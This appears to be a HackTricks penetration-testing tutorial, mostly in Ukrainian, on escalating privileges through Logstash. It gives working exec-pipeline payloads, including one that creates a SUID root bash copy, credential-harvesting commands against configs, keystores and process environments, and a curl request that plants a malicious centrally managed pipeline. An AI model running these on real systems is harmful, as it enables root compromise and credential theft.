# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash використовується для **збирання, перетворення та відправлення журналів** через систему, відому як **pipelines**. Ці **pipelines** складаються з етапів **input**, **filter** та **output**. Цікава особливість виникає, коли Logstash працює на компрометованій машині.

### Pipeline Configuration

Pipelines налаштовуються у файлі **/etc/logstash/pipelines.yml**, який перераховує місця розташування конфігурацій pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Цей файл показує, де розташовані файли **.conf**, що містять конфігурації **pipelines**. При використанні **Elasticsearch output module** часто **pipelines** містять **Elasticsearch credentials**, які зазвичай мають широкі привілеї через те, що Logstash повинен записувати дані до Elasticsearch. Wildcards у шляхах конфігурацій дозволяють Logstash виконувати всі відповідні pipelines у вказаному каталозі.

Якщо Logstash запускається з `-f <directory>` замість `pipelines.yml`, **усі файли всередині цього каталогу конкатенуються в лексикографічному порядку й парсяться як єдина конфігурація**. Це створює два наступальні наслідки:

- Додавання файлу, наприклад `000-input.conf` або `zzz-output.conf`, може змінити те, як збирається фінальна pipeline
- Неправильний (malformed) файл може завадити завантаженню всієї pipeline, тому ретельно перевіряйте payloads перед тим, як покладатися на auto-reload

### Швидка перевірка на скомпрометованому хості

На машині, де встановлено Logstash, швидко перевірте:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Також перевірте, чи доступний локальний API моніторингу. За замовчуванням він слухає на **127.0.0.1:9600**, що зазвичай достатньо після отримання доступу до хоста:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Це зазвичай дає вам ID пайплайнів, деталі виконання та підтвердження, що ваш змінений pipeline було завантажено.

Облікові дані, відновлені з Logstash, зазвичай відкривають доступ до **Elasticsearch**, тому перегляньте [цю іншу сторінку про Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Щоб спробувати privilege escalation, спочатку визначте користувача, від імені якого працює сервіс Logstash, зазвичай користувач **logstash**. Переконайтеся, що ви відповідаєте **одній** із цих умов:

- Мати **write access** до файлу pipeline **.conf** **або**
- Файл **/etc/logstash/pipelines.yml** використовує wildcard, і ви можете записувати в цільову папку

Крім того, має бути виконана **одна** з цих умов:

- Можливість перезапустити сервіс Logstash **або**
- Файл **/etc/logstash/logstash.yml** має встановлене **config.reload.automatic: true**

Якщо у конфігурації використано wildcard, створення файлу, який відповідає цьому wildcard, дозволяє виконувати команди. Наприклад:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Тут, **interval** визначає частоту виконання у секундах. У наведеному прикладі команда **whoami** виконується кожні 120 секунд, а її вивід спрямовується до **/tmp/output.log**.

Якщо в **/etc/logstash/logstash.yml** встановлено **config.reload.automatic: true**, Logstash автоматично виявлятиме й застосовуватиме нові або змінені конфігурації pipeline без потреби перезапуску. Якщо немає wildcard, модифікації все ще можна вносити до існуючих конфігурацій, але слід бути обережним, щоб уникнути збоїв.

### Більш надійні Pipeline payloads

Плагін вводу `exec` досі працює в поточних релізах і вимагає або `interval`, або `schedule`. Він виконується шляхом **forking** Logstash JVM, тож якщо пам'ять обмежена, ваш payload може зазнати збою з `ENOMEM` замість того, щоб працювати мовчки.

Більш практичний privilege-escalation payload зазвичай — той, що залишає стійкий артефакт:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Якщо ви не маєте прав на перезапуск, але можете посилати сигнал процесу, Logstash також підтримує перезавантаження, ініційоване за допомогою **SIGHUP** на Unix-подібних системах:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Майте на увазі, що не кожен плагін підтримує автоматичне повторне завантаження. Наприклад, введення **stdin** перешкоджає автоматичному перезавантаженню, тож не варто припускати, що `config.reload.automatic` завжди підхопить ваші зміни.

### Викрадення секретів з Logstash

Перш ніж зосереджуватись лише на виконанні коду, зберіть дані, до яких Logstash уже має доступ:

- Паролі у відкритому тексті часто захардкоджені всередині `elasticsearch {}` outputs, `http_poller`, JDBC inputs або налаштувань, пов'язаних з хмарою
- Безпечні налаштування можуть зберігатися в **`/etc/logstash/logstash.keystore`** або в іншому каталозі `path.settings`
- Пароль до keystore часто передається через **`LOGSTASH_KEYSTORE_PASS`**, а пакункові інсталяції зазвичай беруть його з **`/etc/sysconfig/logstash`**
- Розгортання змінних середовища у вигляді `${VAR}` відбувається під час старту Logstash, тож середовище сервісу варто перевірити

Корисні перевірки:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Це також варто перевірити, адже **CVE-2023-46672** показала, що Logstash може записувати чутливу інформацію в логи за певних обставин. На хості після постексплуатації старі логи Logstash та записи `journald` можуть розкрити облікові дані навіть якщо поточна конфігурація посилається на keystore замість зберігання секретів inline.

### Зловживання централізованим керуванням pipeline

У деяких середовищах хост взагалі не покладається на локальні файли `.conf`. Якщо **`xpack.management.enabled: true`** налаштовано, Logstash може витягувати централізовано керовані pipeline з Elasticsearch/Kibana, і після увімкнення цього режиму локальні конфіги pipeline більше не є джерелом істини.

Це означає інший шлях атаки:

1. Отримати облікові дані Elastic з локальних налаштувань Logstash, keystore або логів
2. Перевірити, чи має обліковий запис кластерну привілей **`manage_logstash_pipelines`**
3. Створити або замінити централізовано керований pipeline, щоб хост Logstash виконав ваш payload при наступному інтервалі опитування

The Elasticsearch API used for this feature is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Це особливо корисно, коли локальні файли доступні лише для читання, але Logstash вже зареєстровано для віддаленого отримання pipelines.

## Посилання

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
